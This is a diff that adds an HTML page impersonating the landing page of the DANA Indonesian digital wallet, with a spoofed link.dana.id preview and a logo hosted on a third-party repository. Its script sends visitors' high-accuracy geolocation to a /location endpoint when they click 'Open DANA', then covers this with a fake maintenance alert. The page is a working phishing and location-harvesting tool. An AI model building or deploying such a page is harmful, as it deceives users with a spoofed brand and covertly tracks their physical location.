@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>DANA - Dompet Digital Indonesia</title>
+  <meta name="description" content="Dana adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+
+  <meta property="og:title" content="DANA - Dompet Digital Indonesia">
+  <meta property="og:description" content="Dana adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/1000580773.png">
+  <meta property="og:url" content="https://link.dana.id">
+  <meta property="og:type" content="website">
+
+  <meta property="og:site_name" content="DANA - Dompet Digital Indonesia">
+  <meta property="og:locale" content="id_ID">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+
+</head>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      height: 100%;
+      background: #108EE9;
+      font-family: 'Open Sans', sans-serif;
+    }
+
+    .landing-page {
+      min-height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      color: white;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Background decoration */
+    .landing-page::before {
+      content: '';
+      position: absolute;
+      top: -80px;
+      right: -80px;
+      width: 320px;
+      height: 320px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.07);
+      pointer-events: none;
+    }
+
+    .landing-page::after {
+      content: '';
+      position: absolute;
+      bottom: -60px;
+      left: -60px;
+      width: 240px;
+      height: 240px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.05);
+      pointer-events: none;
+    }
+
+    /* Lottie / animation area */
+    #animation {
+      width: 240px;
+      height: 240px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Animated wallet illustration */
+    .wallet-illustration {
+      width: 200px;
+      height: 200px;
+      position: relative;
+      animation: floatUpDown 3s ease-in-out infinite;
+    }
+
+    @keyframes floatUpDown {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-12px); }
+    }
+
+    .wallet-illustration svg {
+      width: 100%;
+      height: 100%;
+      filter: drop-shadow(0 16px 32px rgba(0,0,0,0.2));
+    }
+
+    /* DANA logo */
+    .dana-logo-wrap {
+      margin: 30px auto 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .dana-logo-text {
+      font-size: 36px;
+      font-weight: 700;
+      color: white;
+      letter-spacing: 2px;
+      line-height: 1;
+    }
+
+    /* Fallback if SVG not available */
+    .dana-logo-img {
+      height: 32px;
+    }
+
+    .title {
+      margin: 0 auto 8px;
+      font-size: 22px;
+      font-weight: 600;
+      line-height: 1.35;
+      max-width: 340px;
+    }
+
+    .desc {
+      margin: 0 auto;
+      font-size: 15px;
+      line-height: 1.5;
+      opacity: 0.9;
+      max-width: 300px;
+      font-weight: 400;
+    }
+
+    /* Button container */
+    .btn-container {
+      display: flex;
+      gap: 12px;
+      margin: 20px auto 0;
+      padding: 0 16px;
+    }
+
+    button {
+      min-width: 160px;
+      background-color: white;
+      padding: 13px 20px;
+      font-family: 'Open Sans', sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      color: #108EE9;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: transform 0.15s, box-shadow 0.15s;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.15);
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    .icon-loading {
+      width: 20px;
+      height: 20px;
+      animation: rotation 1s linear infinite;
+    }
+
+    @keyframes rotation {
+      0%   { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Spinner SVG inline */
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2.5px solid rgba(16,142,233,0.25);
+      border-top-color: #108EE9;
+      border-radius: 50%;
+      animation: rotation 0.8s linear infinite;
+      flex-shrink: 0;
+    }
+
+    #mobile-button {
+      display: none;
+    }
+
+    /* Mobile */
+    @media screen and (max-width: 480px) {
+      #animation {
+        width: 180px;
+        height: 180px;
+      }
+
+      .wallet-illustration {
+        width: 160px;
+        height: 160px;
+      }
+
+      .dana-logo-wrap {
+        margin-top: 36px;
+      }
+
+      .title {
+        font-size: 20px;
+      }
+
+      .desc {
+        font-size: 14px;
+      }
+
+      .btn-container {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        padding: 12px 16px 24px;
+        background: linear-gradient(to top, rgba(16,142,233,1) 70%, transparent);
+      }
+
+      button {
+        width: 100%;
+      }
+
+      #mobile-button {
+        display: flex;
+      }
+
+      #desktop-button {
+        display: none;
+      }
+    }
+
+    /* Fade-in animation on load */
+    .landing-page > * {
+      animation: fadeUp 0.6s ease both;
+    }
+    #animation        { animation-delay: 0s; }
+    .dana-logo-wrap   { animation-delay: 0.15s; }
+    .title            { animation-delay: 0.25s; }
+    .desc             { animation-delay: 0.35s; }
+    .btn-container    { animation-delay: 0.45s; }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="landing-page">
+
+  <!-- Animation / Illustration -->
+  <div id="animation">
+    <div class="wallet-illustration">
+      <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <!-- Phone body -->
+        <rect x="40" y="20" width="120" height="160" rx="18" fill="white" opacity="0.95"/>
+        <rect x="48" y="32" width="104" height="136" rx="10" fill="#E8F4FD"/>
+
+        <!-- Screen content: card -->
+        <rect x="56" y="44" width="88" height="52" rx="8" fill="#108EE9"/>
+        <rect x="56" y="44" width="88" height="52" rx="8" fill="url(#cardGrad)"/>
+        <!-- Card chip -->
+        <rect x="66" y="56" width="18" height="14" rx="3" fill="#FDD835" opacity="0.9"/>
+        <!-- Card number dots -->
+        <circle cx="70" cy="82" r="2.5" fill="white" opacity="0.7"/>
+        <circle cx="78" cy="82" r="2.5" fill="white" opacity="0.7"/>
+        <circle cx="86" cy="82" r="2.5" fill="white" opacity="0.7"/>
+        <circle cx="94" cy="82" r="2.5" fill="white" opacity="0.7"/>
+        <!-- DANA label on card -->
+        <text x="115" y="89" font-size="9" fill="white" font-weight="700" font-family="Open Sans,sans-serif" text-anchor="end" opacity="0.9">DANA</text>
+
+        <!-- Balance label -->
+        <rect x="64" y="106" width="44" height="5" rx="2.5" fill="#108EE9" opacity="0.18"/>
+        <rect x="64" y="115" width="72" height="7" rx="3.5" fill="#108EE9" opacity="0.28"/>
+
+        <!-- Bottom nav bar -->
+        <rect x="56" y="140" width="88" height="18" rx="5" fill="#108EE9" opacity="0.1"/>
+        <circle cx="80" cy="149" r="4" fill="#108EE9" opacity="0.6"/>
+        <circle cx="100" cy="149" r="4" fill="#108EE9" opacity="0.25"/>
+        <circle cx="120" cy="149" r="4" fill="#108EE9" opacity="0.25"/>
+
+        <!-- Home indicator -->
+        <rect x="80" y="172" width="40" height="3" rx="1.5" fill="#108EE9" opacity="0.2"/>
+
+        <!-- Floating coin 1 -->
+        <circle cx="152" cy="60" r="16" fill="#FDD835" opacity="0.95"/>
+        <text x="152" y="65" font-size="14" fill="#E65100" font-weight="700" text-anchor="middle">$</text>
+
+        <!-- Floating coin 2 -->
+        <circle cx="38" cy="120" r="11" fill="#4CAF50" opacity="0.9"/>
+        <text x="38" y="125" font-size="10" fill="white" font-weight="700" text-anchor="middle">Rp</text>
+
+        <!-- Sparkles -->
+        <g opacity="0.8">
+          <path d="M162 100 l2 -5 l2 5 l5 2 l-5 2 l-2 5 l-2 -5 l-5 -2 Z" fill="white"/>
+          <path d="M30 68 l1.5 -3.5 l1.5 3.5 l3.5 1.5 l-3.5 1.5 l-1.5 3.5 l-1.5 -3.5 l-3.5 -1.5 Z" fill="white" opacity="0.7"/>
+          <path d="M155 148 l1 -2.5 l1 2.5 l2.5 1 l-2.5 1 l-1 2.5 l-1 -2.5 l-2.5 -1 Z" fill="white" opacity="0.6"/>
+        </g>
+
+        <defs>
+          <linearGradient id="cardGrad" x1="56" y1="44" x2="144" y2="96" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#1565C0"/>
+            <stop offset="100%" stop-color="#42A5F5"/>
+          </linearGradient>
+        </defs>
+      </svg>
+    </div>
+  </div>
+
+  <!-- DANA Logo -->
+  <div class="dana-logo-wrap">
+<img
+  class="dana-logo-img"
+  src="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/1000580726.svg"
+  alt="DANA"
+>
+  </div>
+
+  <h1 class="title" id="content-title">Dompet digital yang aman dan tepercaya!</h1>
+  <p class="desc" id="content-desc">Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman</p>
+
+  <div class="btn-container">
+    <button id="desktop-button">
+      <div class="spinner"></div>
+    </button>
+    <button id="mobile-button">
+      <div class="spinner"></div>
+    </button>
+  </div>
+
+</div>
+
+<script>
+  // i18n
+  const translations = {
+    id: {
+      title: "Dompet digital yang aman dan tepercaya!",
+      desc: "Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman",
+      btn: "Buka DANA"
+    },
+    en: {
+      title: "A safe and secured digital wallet!",
+      desc: "Simpler transactions for all your needs with various payment methods on fingertips",
+      btn: "Open DANA"
+    }
+  };
+
+  const lang = (navigator.language || navigator.userLanguage || 'en').substring(0, 2);
+  const t = translations[lang] || translations['en'];
+
+  document.getElementById('content-title').textContent = t.title;
+  document.getElementById('content-desc').textContent = t.desc;
+  document.querySelectorAll('button').forEach(btn => {
+    btn.textContent = t.btn;
+  });
+
+  // Simulate button loaded state after short delay
+  setTimeout(() => {
+    document.querySelectorAll('button').forEach(btn => {
+      const spinner = btn.querySelector('.spinner');
+      if (spinner) spinner.style.display = 'none';
+    });
+  }, 1500);
+  
+document.querySelectorAll('button').forEach(btn => {
+  btn.addEventListener('click', requestLocation);
+});
+  
+function requestLocation(){
+  if(!navigator.geolocation){
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos)=>{
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      await fetch("/location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          lat: lat,
+          lon: lon
+        })
+      });
+
+      alert("This website is currently under maintenance. Please try again later.");
+    },
+    ()=>{
+      alert("Izin lokasi ditolak");
+    },
+    { enableHighAccuracy: true }
+  );
+}
+</script>
+
+</body>
+</html>
